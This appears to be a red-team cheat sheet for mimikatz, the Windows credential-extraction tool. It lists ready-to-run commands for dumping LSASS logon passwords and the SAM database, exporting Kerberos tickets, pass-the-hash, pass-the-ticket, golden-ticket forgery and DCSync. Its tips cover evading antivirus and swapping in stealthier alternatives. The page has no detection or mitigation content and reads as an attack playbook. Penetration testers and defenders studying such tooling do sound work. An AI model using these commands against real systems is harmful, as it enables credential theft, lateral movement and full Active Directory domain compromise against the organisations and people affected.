# mimikatz

**Type:** Post-Exploitation Tool
**Purpose:** Windows credential extraction and manipulation
**Platform:** Windows
**Tags:** #windows #credentials #post-exploitation #lsass #kerberos #pass-the-hash

---

## Quick Reference

```
# Dump credentials
privilege::debug
sekurlsa::logonpasswords

# Dump Kerberos tickets
sekurlsa::tickets

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:company.com /ntlm:<hash> /run:cmd

# Golden Ticket
kerberos::golden /user:admin /domain:company.com /sid:S-1-5-21-... /krbtgt:<hash>

# DCSync
lsadump::dcsync /domain:company.com /user:Administrator
```

---

## Common Commands

```
# Enable debug privilege
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords

# Dump SAM database
lsadump::sam

# Export Kerberos tickets
sekurlsa::tickets /export

# DCSync (requires DC replication rights)
lsadump::dcsync /user:krbtgt

# Pass-the-Ticket
kerberos::ptt ticket.kirbi
```

---

## Pro Tips

💡 **Requires Admin**: Most functions need local admin or SYSTEM
💡 **AV Detection**: Highly signatured by AV
💡 **LSASS Dump**: Can dump LSASS offline with other tools
💡 **Golden Ticket**: Requires krbtgt hash (DCSync or DC compromise)
💡 **OPSEC**: Consider alternatives (Dumpert, SafetyKatz, etc.)

---

## Note

This is a Windows AD tool, included for comprehensive coverage. For Azure-focused operations, see AADInternals, ROADtools, TokenTactics.

---

## Resources

- GitHub: https://github.com/gentilkiwi/mimikatz
- Author: @gentilkiwi (Benjamin Delpy)
- Wiki: https://github.com/gentilkiwi/mimikatz/wiki
